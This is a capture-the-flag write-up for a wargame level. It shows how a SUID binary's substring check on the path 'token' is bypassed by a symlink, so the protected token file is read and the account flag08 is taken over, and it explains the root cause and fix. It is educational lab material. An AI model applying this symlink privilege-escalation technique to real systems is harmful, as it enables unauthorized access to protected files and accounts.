# Level 08

## 1. Target Information
- **User:** `level08`
- **Password:** `***FLAG07***`
- **Target:** `flag08`
- **SSH Port:** `4242`

---

## 2. Reconnaissance & Discovery
Look at the home directory and run the binary with no arguments:

```bash
ls -la
./level08
# level08 [file to read]
```

**Findings:**
- A SUID executable owned by `flag08`, plus a `token` file owned by `flag08` that `level08` cannot read:
```text
-rwsr-s---+ 1 flag08 level08 ... level08
-r--------  1 flag08 flag08  ... token
```
- The usage message (`level08 [file to read]`) shows the program takes a **file path** and reads it. Because it is SUID `flag08`, it reads files with `flag08`'s privileges — including the `token` file we can't read ourselves.

### Why not a format string bug?
`strings`/first inspection shows `printf` calls, which suggested a format-string attack. But the user input is passed as an **argument** (`printf("...%s...", argv[1])`), not as the format string itself (`printf(argv[1])`). The `%` specifiers are hardcoded in the literal, so there is nothing to exploit there — the `printf` is only used to print usage/refusal messages.

### Tracing the real logic with ltrace
```bash
ltrace ./level08 /etc/passwd
```
```text
strstr("/etc/passwd", "token")              = NULL
open("/etc/passwd", 0, ...)                 = 3
read(3, "root:x:0:0:root:/root:/bin/bash\n"..., 1024) = 1024
write(1, "root:x:0:0:root:/root:/bin/bash\n"..., 1024)
+++ exited (status 0) +++
```
Reconstructed behavior:
- `strstr(argv[1], "token")` — refuse if the **argument string** contains the substring `token`.
- otherwise `open(argv[1], O_RDONLY)` (flag `0`), `read` one 1024-byte chunk, `write` it to stdout.

So the program is a "read any file as `flag08`" primitive, gated by a single check on the **spelling** of the path.

---

## 3. Vulnerability Analysis
- **Flaw Type:** Access-control check on a path *string* instead of the *resource* it resolves to (bypassable via symlink indirection).
- **Technical Explanation:**
  - The target file we want is `~/token`, but every path that names it contains the substring `token`, so `strstr` blocks it.
  - The flaw: `strstr` inspects **the text passed on the command line**, while `open()` acts on **the file that text resolves to on disk** — following symlinks. These two judge different things.
  - `strstr` has no concept of path components or the filesystem; it is a raw substring scan. It blocks `token`, `~/token`, even `/tmp/notokenhere` (false positive). But it never asks *what file* the string points to.
  - A symlink is a file that is spelled one way but points somewhere else. Name it without the substring `token`, point it at `~/token`:
    - `strstr("/tmp/x", "token")` → `NULL` → check passes.
    - `open("/tmp/x", O_RDONLY)` → kernel follows the symlink → opens the real `~/token` as `flag08`.
  - **Root cause / fix:** never validate a user-supplied path string. Resolve it first (`realpath`) and validate that, or check the opened descriptor's identity (`fstat` the fd). A name is not a stable identity for a resource.

---

## 4. Exploitation Walkthrough

### Step 1: Point a differently-named symlink at the token
```bash
ln -s ~/token /tmp/x        # "/tmp/x" has no "token" substring
```

### Step 2: Feed the symlink to the SUID binary
```bash
./level08 /tmp/x
# strstr("/tmp/x","token") = NULL → opens ~/token as flag08 and dumps it
# ***PASS_FLAG08***
```

The dumped contents are `flag08`'s password.

### Step 3: Become flag08 and grab the flag
```bash
su flag08
# Password: ***PASS_FLAG08***
getflag
# Check flag.Here is your token : ***FLAG08***
```

---

## 5. Flag
```text
***FLAG08***
```
- **Next Level User:** `level09`
- **Password for next level:** `***FLAG08***`
